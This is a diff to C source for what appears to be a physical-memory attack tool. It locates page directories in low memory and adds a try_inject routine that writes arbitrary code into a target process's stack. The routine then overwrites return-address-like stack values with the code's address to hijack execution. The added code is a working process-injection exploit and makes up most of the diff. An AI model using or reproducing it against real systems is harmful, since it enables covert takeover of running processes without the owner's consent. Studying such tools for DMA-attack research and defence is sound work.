@@ -92,25 +92,98 @@ void dump_page_wide(FILE *f, uint32_t pn, char* page, char* diffpage)
 	}
 }}}
 
-void try_inject(linear_handle lin, char *code, int codelen)
+void try_inject(linear_handle lin, addr_t pagedir, char *code, int codelen)
 {{{
 	addr_t stack_bottom;
 	addr_t binary_first;
 	addr_t binary_last;
-	// first seek the stack-page with environment and stuff
+	addr_t code_location;
+	char page[4096];
+
+	// seek the stack-page with environment and stuff
 	stack_bottom = linear_seek_mapped_page(lin, 0xbffff, 0x1000, -1);
 
-	// now seek bounds of mapped binary
+	// seek bounds of mapped binary
 	binary_first = linear_seek_mapped_page(lin, 0x08000, 0x1000, 1);
 	binary_last = linear_seek_unmapped_page(lin, binary_first, 0x1000, 1);
-	binary_last--;
 
-	// inject code into stack
+	if( ((int64_t)stack_bottom == -1) || ((int64_t)binary_first == -1) || ((int64_t)binary_last == -1) ) {
+		printf("\tfailed to find stack or binary bounds!\n"
+			"\taborting!\n");
+		return;
+	}
 
+	binary_last--;				// go to last mapped
+	binary_first = binary_first << 12;	// get addresses from pagenumbers
+	binary_last = binary_last << 12;
+
+	//
+	// inject code into stack, right before arguments
+	// seek the place to inject:
+	char*p;
+	char*q;
+
+	int is_not_empty=0;
+	linear_read_page(lin, stack_bottom, page);
+	p = page+4096 - 1 - 4;
+	while( (*p != 0) || (*(p-1) != 0) )
+		p--;
+	p--;
+	p -= codelen;
+	code_location = (p - page) + (stack_bottom << 12);
+	// check if there is place (should be all zero)
+	q = p+codelen;
+	for(p = p; p <= q; p++)
+		if(*p)
+			is_not_empty=1;
+	if(is_not_empty)
+		printf("\t" TERM_BLUE "the place where i am injecting MAY contain process-data or -stack!" TERM_RESET "\n");
+	//insert code
+	printf("\tinserting code into the stack at 0x%08llx\n", code_location);
+	linear_write(lin, code_location, code, codelen);
 
 	// replace all interesting pointers on stack with pointer to our code
+	// this part is tricky... we will overwrite value by value. if one of
+	// these is dereferenced by the target, we do not know this.
+	//
+	// so we will test if the process exists before each write to a value
+	// (by testing if the pagetable of the process still exists).
+	uint32_t stackvalue;			// buffer for loading values from stack
+	uint32_t dest_value;			// the value we wish to write
+	addr_t seeker;				// pointer for seeking over the stack
+	int do_sleep = 0;
 
-
+	seeker = code_location;
+	seeker = seeker - (seeker & 3);		// align to 32 bit locations.
+	dest_value = code_location;
+#ifdef __BIG_ENDIAN__
+	dest_value = endian_swap32(dest_value);
+#endif
+	while(1) {
+		if(linear_is_pagedir_fast(lin, pagedir)) {
+			if(0 > linear_read(lin, seeker, &stackvalue, 4)) {
+				printf("\t" TERM_BLUE "reached top of stack" TERM_RESET "\n");
+				break;
+			}
+#ifdef __BIG_ENDIAN__
+			stackvalue = endian_swap32(stackvalue);
+#endif
+			if( (stackvalue > binary_first) && (stackvalue < binary_last) ) {
+				printf("overwriting value at 0x%08llx: 0x%08x with codebase\n", seeker, stackvalue);
+				// could be a value; just overwrite it.
+				linear_write(lin, seeker, &dest_value, 4);
+				do_sleep = 1;
+			}
+		} else {
+			printf("\t" TERM_BLUE "process terminated" TERM_RESET "\n");
+			break;
+		}
+		seeker -= 4;
+		if(do_sleep) {
+			do_sleep = 0;
+			sleep(1);
+		}
+	}
 }}}
 
 void usage(char* argv0)
@@ -233,7 +306,7 @@ int main(int argc, char**argv)
 	}
 
 	// search all pages in lowmem for pagedirs
-	// then, for each found, print process name
+	// then, for each found, check process
 	for( pn = 0; pn < 0x40000; pn++ ) {
 		if((pn%0x100) == 0) {
 			printf("0x%05llx\r", pn);
@@ -278,9 +351,11 @@ int main(int argc, char**argv)
 						if(codelen == 4095) {
 							printf("possibly truncated code after byte 4096.\n"
 								"this is the max size for injecting code!\n");
+						} else {
+							printf("\tgot %d bytes from \"%s\".\n", codelen, inject_file);
 						}
 
-						try_inject(lin, codebuffer, codelen);
+						try_inject(lin, pn, codebuffer, codelen);
 						close(fd);
 
 						break;
